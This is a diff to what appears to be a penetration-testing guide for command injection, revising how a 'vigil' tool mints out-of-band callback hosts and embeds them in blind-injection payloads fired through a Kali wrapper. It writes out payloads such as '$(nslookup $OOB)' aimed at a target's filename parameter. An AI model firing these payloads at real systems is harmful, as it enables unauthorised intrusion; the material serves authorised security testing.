@@ -24,7 +24,7 @@ Command injection in 2025 lives in: file conversion endpoints (ImageMagick, FFmp
 - Burp Suite Repeater + Intruder (craft the request — then replay via kali exec for audit pipeline coverage)
 - `vigil assess kali exec --technique CMDI --probe-kind payload --phase consume-test --timeout 300 -- commix ...` (automated command injection — useful for initial sweep, but misses argument injection entirely)
 - `vigil assess classify-payload <value> --mutations` (type the injected parameter value and generate type-aware variants — see "Type the Injected Value First" below)
-- `vigil oob mint` / `vigil oob poll` (mint a nonce-tagged callback URL and correlate blind-injection hits — see DNS-Based below; this replaces reading the listener log by hand)
+- `vigil oob mint` / `vigil oob poll` (mint a nonce-tagged callback and correlate blind-injection hits — `mint` binds the nonce under a running client's interactsh id so `poll` can correlate it; pass `--client <name>` when several clients run; fire the EXACT host mint prints (`$OOB_HOST`); see DNS-Based below; this replaces reading the listener log by hand)
 - Custom wordlists for injection payloads (prepare host-side, deliver via kali exec)
 
 ---
@@ -235,16 +235,14 @@ Confirm readiness with `vigil oob status --json`, then **mint a nonce-tagged cal
 
 ```bash
 # Mint one nonce per injection point; record the correlation context.
-vigil oob mint --technique cmdi --target-url "https://target/convert" --param filename --probe-kind dns
-# -> nonce  <prefix>-<token>
-#    http   http://<prefix>-<token>.researcher.example/
-#    dns    <prefix>-<token>.researcher.example
+vigil oob mint --client <name> --technique cmdi --target-url "https://target/convert" --param filename --probe-kind dns
+# → host  <prefix>-<token>.<client-id>.researcher.example   (= $OOB_HOST)
 ```
 
-Embed the minted host in the payload and fire it through the kali exec wrapper:
+Embed the EXACT host mint prints (`$OOB_HOST` — the nonce bound under the client id; never hand-build a bare `<nonce>.oob...` host) in the payload and fire it through the kali exec wrapper:
 
 ```bash
-OOB=<prefix>-<token>.researcher.example
+OOB=$OOB_HOST
 # Subshell
 $(nslookup $OOB)
 # Backtick
